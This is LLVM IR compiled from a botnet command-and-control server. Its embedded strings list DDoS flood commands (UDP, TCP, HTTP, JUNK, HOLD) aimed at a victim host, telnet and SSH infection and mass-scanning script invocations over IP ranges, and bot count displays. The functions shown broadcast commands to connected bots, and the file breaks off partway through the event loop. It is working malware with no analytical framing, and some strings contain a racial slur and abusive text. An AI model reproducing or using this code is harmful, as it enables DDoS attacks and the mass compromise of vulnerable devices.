; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.telnetdata_t, [8 x i8] }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[31m> \1B[0m\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.17 = private unnamed_addr constant [33 x i8] c"%c]0;BOT COUNT: %d| NIGGAS: %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [10 x %struct.login_info] zeroinitializer, align 16
@.str.21 = private unnamed_addr constant [21 x i8] c"\1B[30mUsername:\1B[30m \00", align 1
@.str.23 = private unnamed_addr constant [21 x i8] c"\1B[30mPassword:\1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [28 x i8] c"\1B[31mWRONG ANSWER BITCH!!\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [107 x i8] c"\1B[31m _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD\EF\BF\BD____  _\EF\BF\BD\EF\BF\BD_ \EF\BF\BD  _\EF\BF\BD\EF\BF\BD_\EF\BF\BD\EF\BF\BD\EF\BF\BD_  _\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD_   _\EF\BF\BD\EF\BF\BD_ _\EF\BF\BD_\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [97 x i8] c"\1B[31m\EF\BF\BD     _\EF\BF\BD \EF\BF\BD  _\EF\BF\BD   \EF\BF\BD \EF\BF\BD  \EF\BF\BD _\EF\BF\BD \EF\BF\BD   \EF\BF\BD   \EF\BF\BD \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD \EF\BF\BD  \EF\BF\BD\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [99 x i8] c"\1B[31m\EF\BF\BD __\EF\BF\BD\EF\BF\BD     \EF\BF\BD_____  \EF\BF\BD  \EF\BF\BD\EF\BF\BD_  \EF\BF\BD  \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD  \EF\BF\BD      \EF\BF\BD \EF\BF\BD  \EF\BF\BD    \EF\BF\BD\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [85 x i8] c"\1B[31m  \EF\BF\BD        \EF\BF\BD    \EF\BF\BD    \EF\BF\BD   \EF\BF\BD  _\EF\BF\BD    \EF\BF\BD  \EF\BF\BD_    _\EF\BF\BD   \EF\BF\BD    \EF\BF\BD \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [89 x i8] c"\1B[31m   \EF\BF\BD____\EF\BF\BD _\EF\BF\BD____   _\EF\BF\BD   \EF\BF\BD  \EF\BF\BD     \EF\BF\BD     \EF\BF\BD\EF\BF\BD\EF\BF\BD\EF\BF\BD   _\EF\BF\BD   _\EF\BF\BD  \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [81 x i8] c"\1B[31m       \EF\BF\BD  \EF\BF\BD    \EF\BF\BD   \EF\BF\BD    \EF\BF\BD  \EF\BF\BD     \EF\BF\BD            \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [71 x i8] c"\1B[31m          \EF\BF\BD        \EF\BF\BD                          \EF\BF\BD    \EF\BF\BD   \0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [39 x i8] c"\0D\0A\1B[34m\09\09~[\1B[31mWelcome, %s\1B[34m  ]~\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [41 x i8] c"\1B[34m\09\09~[\1B[31mBOT COUNT: %d\1B[34m\09   ]~\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [13 x i8] c"\1B[32m> \1B[37m\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.37 = private unnamed_addr constant [29 x i8] c"BOT COUNT: %d | NIGGAS: %d\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.39 = private unnamed_addr constant [41 x i8] c"TELNET DEVICES: %d | TELNET STATUS: %d\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"STATS\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"INFECT\00", align 1
@.str.42 = private unnamed_addr constant [30 x i8] c"python telnet.py filtered.txt\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"REINFECT\00", align 1
@.str.44 = private unnamed_addr constant [29 x i8] c"python w.py filtered_ssh.txt\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"FILTER\00", align 1
@.str.46 = private unnamed_addr constant [93 x i8] c"sort telnet.txt | uniq -u>>filtered_telnet.txt;sort infected.txt | uniq -u>>filtered_ssh.txt\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"LOAD\00", align 1
@.str.48 = private unnamed_addr constant [29 x i8] c"python scan.py 376 LOAD 88 1\00", align 1
@.str.49 = private unnamed_addr constant [6 x i8] c"SCAN1\00", align 1
@.str.50 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.92 lol\00", align 1
@.str.51 = private unnamed_addr constant [6 x i8] c"SCAN2\00", align 1
@.str.52 = private unnamed_addr constant [32 x i8] c"python scan.py 376 B 119.93 lol\00", align 1
@.str.53 = private unnamed_addr constant [6 x i8] c"SCAN3\00", align 1
@.str.54 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.25 1\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"SCAN4\00", align 1
@.str.56 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.26 1\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"SCAN5\00", align 1
@.str.58 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 125.27\091\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"SCAN6\00", align 1
@.str.60 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 113.53 1\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"SCAN7\00", align 1
@.str.62 = private unnamed_addr constant [31 x i8] c"python scan.py 376 B 180.180 1\00", align 1
@.str.63 = private unnamed_addr constant [6 x i8] c"SCAN8\00", align 1
@.str.64 = private unnamed_addr constant [30 x i8] c"python scan.py 376 B 185.52 1\00", align 1
@.str.65 = private unnamed_addr constant [6 x i8] c"LUCKY\00", align 1
@.str.66 = private unnamed_addr constant [30 x i8] c"python scan.py 376 LUCKY 88 1\00", align 1
@.str.67 = private unnamed_addr constant [7 x i8] c"LUCKY2\00", align 1
@.str.68 = private unnamed_addr constant [31 x i8] c"python scan.py 376 LUCKY2 88 1\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"SCAN_OFF\00", align 1
@.str.70 = private unnamed_addr constant [18 x i8] c"killall -9 python\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.72 = private unnamed_addr constant [29 x i8] c"\0D\0A\1B[31m~[ATTACK COMMANDS]~\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [62 x i8] c"\1B[31m~[\1B[37mUDP\1B[31m]~ \1B[37m!* UDP Victim Port Time 32 0 10\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [66 x i8] c"\1B[31m~[\1B[37mTCP\1B[31m]~ \1B[37m!* TCP Victim Port Time 32 all 0 10\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [54 x i8] c"\1B[31m~[\1B[37mSTD\1B[31m]~ \1B[37m!* STD Victim Port Time\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [48 x i8] c"\1B[31m~[\1B[37mHTTP\1B[31m]~ \1B[37m!* HTTP Url Time\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mJUNK\1B[31m]~ \1B[37m!* JUNK Victim Port Time\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [56 x i8] c"\1B[31m~[\1B[37mHOLD\1B[31m]~ \1B[37m!* HOLD Victim Port Time\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [50 x i8] c"\1B[31m~[\1B[37mKILL\1B[31m]~ \1B[37m!* KILLATTK | KILL\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [29 x i8] c"\1B[31m~[SCANNING COMMANDS]~\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [36 x i8] c"\1B[31m~[\1B[37mLOAD\1B[31m]~ \1B[37mLOAD\0D\0A\00", align 1
@.str.82 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN1 | SCAN2 | SCAN3 | SCAN4\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [61 x i8] c"\1B[31m~[\1B[37mSCAN\1B[31m]~ \1B[37mSCAN5 | SCAN6 | SCAN7 | SCAN8\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mLUCKY\1B[31m]~ \1B[37mLUCKY | LUCKY2\0D\0A\00", align 1
@.str.85 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mSTOP\1B[31m]~ \1B[37mSCAN_OFF\0D\0A\00", align 1
@.str.86 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mGENERAL COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSHELL\1B[31m]~ \1B[37m!* SH\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [46 x i8] c"\1B[31m~[\1B[37mBOTS\1B[31m]~ \1B[37m!* BOTS | BOTS\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [52 x i8] c"\1B[31m~[\1B[37mSTATUS\1B[31m]~ \1B[37m!* STATUS | STATUS\0D\0A\00", align 1
@.str.90 = private unnamed_addr constant [38 x i8] c"\1B[31m~[\1B[37mSTATS\1B[31m]~ \1B[37mSTATS\0D\0A\00", align 1
@.str.91 = private unnamed_addr constant [35 x i8] c"\1B[31m~[\1B[37mMISC COMMANDS\1B[31m]~\0D\0A\00", align 1
@.str.92 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mINECTION FILTER\1B[31m]~ \1B[37mFILTER\0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [47 x i8] c"\1B[31m~[\1B[37mTELNET INFECT\1B[31m]~ \1B[37mINFECT\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [49 x i8] c"\1B[31m~[\1B[37mREINFECT BOTS\1B[31m]~ \1B[37mREINFECT\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [44 x i8] c"\1B[31m~[\1B[37mCLEARSCREEN\1B[31m]~ \1B[37mCLEAR\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [40 x i8] c"\1B[31m~[\1B[37mLOGOUT\1B[31m]~ \1B[37mLOGOUT\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.98 = private unnamed_addr constant [14 x i8] c"!* KILLATTK\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"Bye, %s\00", align 1
@.str.103 = private unnamed_addr constant [12 x i8] c"\1B[31m> \1B[0m\00", align 1
@.str.104 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.105 = private unnamed_addr constant [15 x i8] c"server_log.txt\00", align 1
@.str.106 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.107 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.110 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.112 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.117 = private unnamed_addr constant [4 x i8] c"LEL\00", align 1
@.str.118 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.119 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.120 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.121 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @fdgets(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 noundef %28, i8* noundef %32, i64 noundef 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @trim(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* noundef %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 noundef %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 noundef %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8* noundef) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32 noundef) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @broadcast(i8* noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* noundef %13, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* noundef %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias i8* @malloc(i64 noundef %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* noundef %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* noundef %26, i8* noundef %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* noundef %29)
  %30 = call i64 @time(i64* noundef %9) #9
  %31 = call %struct.tm* @localtime(i64* noundef %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* noundef %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* noundef %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %104, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %107

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %104

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %80

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 noundef %71, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 noundef 5, i32 noundef 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* noundef %75) #8
  %77 = call i64 @send(i32 noundef %73, i8* noundef %74, i64 noundef %76, i32 noundef 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 noundef %78, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  br label %80

80:                                               ; preds = %70, %63, %60
  %81 = load i32, i32* %12, align 4
  %82 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 noundef %81)
  %83 = load i32, i32* %12, align 4
  %84 = load i8*, i8** %4, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call i64 @strlen(i8* noundef %85) #8
  %87 = call i64 @send(i32 noundef %83, i8* noundef %84, i64 noundef %86, i32 noundef 16384)
  %88 = load i32, i32* %7, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %100

90:                                               ; preds = %80
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %100

97:                                               ; preds = %90
  %98 = load i32, i32* %12, align 4
  %99 = call i64 @send(i32 noundef %98, i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i64 noundef 13, i32 noundef 16384)
  br label %103

100:                                              ; preds = %90, %80
  %101 = load i32, i32* %12, align 4
  %102 = call i64 @send(i32 noundef %101, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 noundef 1, i32 noundef 16384)
  br label %103

103:                                              ; preds = %100, %97
  br label %104

104:                                              ; preds = %103, %59
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %12, align 4
  br label %35, !llvm.loop !11

107:                                              ; preds = %35
  %108 = load i8*, i8** %8, align 8
  call void @free(i8* noundef %108) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #3

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64* noundef) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm* noundef) #3

declare i64 @send(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #1

declare i32 @printf(i8* noundef, ...) #1

; Function Attrs: nounwind
declare void @free(i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias i8* @calloc(i64 noundef 1000000, i64 noundef 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %297, %1
  %24 = load volatile i32, i32* @epollFD, align 4
